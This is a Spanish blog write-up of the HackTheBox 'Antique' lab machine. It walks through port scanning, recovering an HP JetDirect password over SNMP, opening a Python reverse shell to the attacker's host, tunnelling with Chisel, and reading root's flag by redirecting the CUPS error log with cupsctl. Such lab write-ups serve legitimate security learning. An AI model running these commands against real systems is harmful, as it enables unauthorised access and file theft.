@@ -1,0 +1,236 @@
+---
+title: 'CTF - Antique WriteUp'
+date: '2022-01-30'
+tags: ["CTF", "Hacking", "Pentesting", "#Import 2022-12-20 21:06"]
+draft: false
+authors: ['default']
+summary: Me estreno con este post donde me pongo en la piel de un pentester o Hacker que mola más y trato d
+---
+
+Me estreno con este post donde me pongo en la piel de un pentester o Hacker (que mola más) y trato de conseguir acceso a una de las máquinas de [HackTheBox](https://app.hackthebox.com/). Este tipo de pruebas se denominan Capture The Flag, que básicamente consiste en:
+
+1. Comprometer la máquina y conseguir acceso a ella.
+2. Escalar privilegios de root y obtener el flag final, que consiste en un hash (una cadena de caracteres).
+
+De este modo, introduces el flag en la plataforma y demuestras que has conseguido el reto.
+
+En cualquier caso, vamos al lío. Las fases de un trabajo de este tipo son las siguientes:
+
+![](https://blog.ikerocio.com/content/images/2022/01/fases-proyecto-pentesting-768x478.png)Si bien es cierto que no es un trabajo totalmente lineal y que en cada uno de los momentos debes continuar enumerando dispositivos, analizando vulnerabilidades nuevas que te vas encontrando... podemos resumirlo del siguiente modo:
+
+1. Escaneo
+2. Acceso al sistema
+3. Escalado de privilegios
+
+1. Escaneo
+----------
+
+Este es el punto más automático de todos. En todas las máquinas tienes que seguir la misma metodología y tratar de enumerar el máximo número de puertos abiertos en la máquina que deseas atacar.
+
+
+```
+❯ nmap -p- -sT --open --min-rate 5000 -vvv -n -Pn -oG allPorts antique.htb
+```
+NMAP all ports discovery*donde:*
+
+* *-p- lista los puertos de [0, 65535]*
+* *-sT se centra en los de protocolo TCP*
+* *--open filtra por puertos abiertos*
+* *--min-rate 5000 fija el uso mínimo de 5000 paquetes/s para aumentar la velocidad*
+* *-vvv nos devuelve información de los puertos según los va descubriendo*
+* *-n deshabilita la resolución DNS para hacerlo más rápido*
+* *-Pn trata todos los hosts online, deshabilitando el host discovery*
+* *-oG exporta en formato grep la respuesta del comando a un archivo*
+
+El comando nos arroja el puerto 23 abierto. Lanzamos otro comando más específico a ver si podemos sacar alguna conclusión más próxima de que tenemos delante.
+
+
+```
+❯ nmap -p23 -sCV -vvv -oN targeted antique.htb
+```
+NMAP specific port service version discovery*donde*
+
+* *-p23 especifica el puerto que se desea atacar*
+* *-sCV utiliza los scripts básicos de reconocimiento para tratar de recuperar la versión del servicio en escucha además de otra información básica*
+* *-vvv devuelve información importante*
+* *-oN exporta en formato de NMAP la respuesta del comando a un archivo*
+
+Visualizamos la respuesta y analizamos. En este caso la herramienta no ha sido capaz de recuperar que servicio está corriendo detrás del puerto, pero nos arroja cierta información que ha recuperado.
+
+
+```
+PORT   STATE SERVICE REASON         VERSION
+23/tcp open  telnet? syn-ack ttl 63
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port23-TCP:V=7.92%I=7%D=1/30%Time=61F672BE%P=x86_64-pc-linux-gnu%r(NULL
+SF:,F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nPas
+SF:sword:\x20")%r(tn3270,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(GetReq
+SF:uest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(HTTPOptions,19,"\nHP\x2
+SF:0JetDirect\n\nPassword:\x20")%r(RTSPRequest,19,"\nHP\x20JetDirect\n\nPa
+SF:ssword:\x20")%r(RPCCheck,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNS
+SF:VersionBindReqTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSStatusR
+SF:equestTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Help,19,"\nHP\x20J
+SF:etDirect\n\nPassword:\x20")%r(SSLSessionReq,19,"\nHP\x20JetDirect\n\nPa
+SF:ssword:\x20")%r(TerminalServerCookie,19,"\nHP\x20JetDirect\n\nPassword:
+SF:\x20")%r(TLSSessionReq,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Kerbe
+SF:ros,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(SMBProgNeg,19,"\nHP\x20J
+SF:etDirect\n\nPassword:\x20")%r(X11Probe,19,"\nHP\x20JetDirect\n\nPasswor
+SF:d:\x20")%r(FourOhFourRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r
+SF:(LPDString,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPSearchReq,19,
+SF:"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPBindReq,19,"\nHP\x20JetDire
+SF:ct\n\nPassword:\x20")%r(SIPOptions,19,"\nHP\x20JetDirect\n\nPassword:\x
+SF:20")%r(LANDesk-RC,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(TerminalSe
+SF:rver,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(NCP,19,"\nHP\x20JetDire
+SF:ct\n\nPassword:\x20")%r(NotesRPC,19,"\nHP\x20JetDirect\n\nPassword:\x20
+SF:")%r(JavaRMI,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(WMSRequest,19,"
+SF:\nHP\x20JetDirect\n\nPassword:\x20")%r(oracle-tns,19,"\nHP\x20JetDirect
+SF:\n\nPassword:\x20")%r(ms-sql-s,19,"\nHP\x20JetDirect\n\nPassword:\x20")
+SF:%r(afp,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(giop,19,"\nHP\x20JetD
+SF:irect\n\nPassword:\x20");
+
+```
+Vamos a conectarnos directamente nosotros al puerto 23 mediante telnet a ver que nos encontramos.
+
+
+```
+❯ telnet antique.htb
+Trying 10.10.11.107...
+Connected to antique.htb.
+Escape character is '^]'.
+
+HP JetDirect
+
+Password: 1234
+Invalid password
+Connection closed by foreign host.
+```
+Parece que hay un servicio de gestión de impresoras HP respondiendo, pero no desconocemos la contraseña. Navegando por internet, hayamos el siguiente [post](https://www.exploit-db.com/exploits/22319) donde explican algunos problemas con este servicio. Lanzamos el siguiente comando y tratamos de ver la respuesta.
+
+
+```
+❯ snmpwalk -v 2c -c public antique.htb .1.3.6.1.4.1.11.2.3.9.1.1.13.0
+iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
+33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
+```
+La vulnerabilidad habla de una revelación de la contraseña de acceso en formato hexadecimal, por lo que vamos a empezar por copiar toda la cadena de caracteres después de "BITS:" y decodificarlo a un formato que podamos leer mejor.
+
+
+```
+❯ echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 \106 111 114 115 119 122 123 126 130 131 134 135" | xxd -r -p
+# P@ssw0rd@123!!123�q��"2Rbs3CSs��$4�Eu�WGW�(8i	IY�aA�"1&1A5# 
+```
+Vaya, vamos a probar *P@ssw0rd@123!!123* y ver que pasa.
+
+
+```
+❯ telnet antique.htb
+Trying 10.10.11.107...
+Connected to antique.htb.
+Escape character is '^]'.
+HP JetDirect
+
+Password: P@ssw0rd@123!!123
+
+Please type "?" for HELP
+ 
+```
+Probando distintos datos de entrada, parece que podemos llegar a ejecutar código remotamente. Llegamos incluso a ver que el propio servicio de HP JetDirect es un script de Python por lo que podemos inferir que la máquina es capaz de ejecutar este tipo de archivos.
+
+2. Acceso al sistema
+--------------------
+
+Ponemos en nuestra máquina un servicio escuchando en el puerto 443 y lanzamos desde la consola de Telnet el siguiente script
+
+
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.16",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+Volvemos a nuestra consola donde estábamos esperando la shell...
+
+
+```
+❯ nc -lvp 443
+listening on [any] 443 ...
+connect to [10.10.14.16] from antique.htb [10.10.11.107] 37726
+lp@antique:~$ whoami
+lp
+lp@antique:~$ hostname -I
+10.10.11.107 
+lp@antique:~$ cat user.txt	
+7d28xxxxxxxxxxxxxxxxxxxxx
+```
+Primera flag obtenida. Estamos dentro.
+
+3. Escalado de privilegios
+--------------------------
+
+Llegados a este punto, continuamos viendo que puertos hay abiertos en el sistema.
+
+
+```
+lp@antique:~$ ss -tulpn | grep LISTEN
+tcp     LISTEN   0        4096             0.0.0.0:631           0.0.0.0:*
+tcp     LISTEN   0        128              0.0.0.0:23            0.0.0.0:* users:(("python3",pid=828,fd=3))
+tcp     LISTEN   0        4096                [::]:631              [::]:*
+```
+Si hacemos curl al puerto 631 desde la máquina atacada vemos una web de [CUPS](https://es.wikipedia.org/wiki/Common_Unix_Printing_System) que no es accesible desde nuestro sistema, por lo que no podemos ver nada desde nuestra máquina.
+
+Para trabajar un poco más cómodos, es necesario hacer [pivoting](https://pentestwiki.org/pivoting/). Personalmente, me gusta utilizar ssh para crear un túnel, pero en este caso no tenemos acceso por ssh ni podemos conseguirlo ejecutando un ssh-keygen al no estar instalado en el sistema atacado.
+
+Existe una herramienta denominada [Chisel](https://github.com/jpillora/chisel) que nos permite conseguir lo mismo sin necesitar permisos de root ni de nada.
+
+Procedemos a compilarla en nuestra máquina y lanzamos el servidor en modo reverse, para dejarle al cliente escoger el puerto desde el cual quiere crear el túnel.
+
+
+```
+❯ git clone https://github.com/jpillora/chisel
+❯ cd chisel && go build -ldflags="-s -w"
+❯ sudo ./chisel server -p 8000 --reverse
+```
+Una vez hecho esto, procedemos a enviar el binario a la máquina atacada con el fin de poder ejecutarlo también. Levantamos un servidor en el puerto 8080 con Python.
+
+
+```
+❯ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+```
+Y en el servidor remoto, nos lo descargamos con wget y le damos permisos de ejecución para conectarnos al otro extremo.
+
+
+```
+lp@antique:~$ wget 10.10.14.16:8080/chisel
+...
+chisel              100%[===================]   7.75M  5.53MB/s    in 1.4s
+2022-01-30 12:52:20 (5.53 MB/s) - ‘chisel’ saved [8130560/8130560]
+lp@antique:~$ chmod +x chisel
+lp@antique:~$ ./chisel client 10.10.14.16:8000 R:631:127.0.0.1:631
+./chisel client 10.10.14.16:8000 R:631:127.0.0.1:631
+2022/01/30 12:55:03 client: Connecting to ws://10.10.14.16:8000
+2022/01/30 12:55:03 client: Connected (Latency 43.929004ms)
+```
+Abrimos un navegador desde nuestro sistema et voilà.
+
+![](https://blog.ikerocio.com/content/images/2022/01/Screenshot\_2.png)Lo siguiente que podemos hacer es buscar vulnerabilidades para la versión 1.6.1 de CUPS. Y nos encontramos ante la siguiente [vulnerabilidad](https://www.rapid7.com/db/modules/post/multi/escalate/cups_root_file_read/) y el siguiente [exploit](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/escalate/cups_root_file_read). Es un post de un script de Metasploit que en principio lo vamos a utilizar para entender que hace. Generalmente, estos scripts hacen tareas muy simples y es interesante examinarlos para aprender más aún de ellos. En este caso, la vulnerabilidad se basa en un problema dentro del módulo de administraciónver archivo de registro de error en CUPS. 
+
+Este módulo imprime por pantalla la ubicación del log de error. Además, aquellos usuarios del grupo *lpadmin* son capaces de modificar dicha ubicación con el comando *cupsctl*. Comprobamos que pertenecemos a dicho grupo.
+
+
+```
+lp@antique:~$ id
+uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
+```
+Y procedemos a modificar la ruta a la que queremos acceder con el siguiente comando.
+
+
+```
+lp@antique:~$ cupsctl ErrorLog="/root/root.txt"
+```
+Nos aseguramos que seguimos manteniendo el túnel de Chisel activo y vamos al navegador para revisar el módulo de error de CUPS.
+
+![](https://blog.ikerocio.com/content/images/2022/01/Screenshot\_3-1.png)Ahí está el flag de root. He tenido que recargar la página asegurándome de no cachear la respuesta, ya que al principio no era capaz de ver el resultado. Con esto finalizamos la máquina.
+
+Conclusión
+----------
+
+Esta máquina se nota que es de dificultad fácil aunque no es trivial el escalado de privilegios final si no has trabajado antes con impresoras en Linux. Ha sido necesario investigar el funcionamiento de los scripts de Metasploit para no alargar mucho la resolución de la misma y aunque finalmente solo tienes acceso a leer archivos de la máquina y no es un escalado de privilegios real, podemos darla por terminada.
+
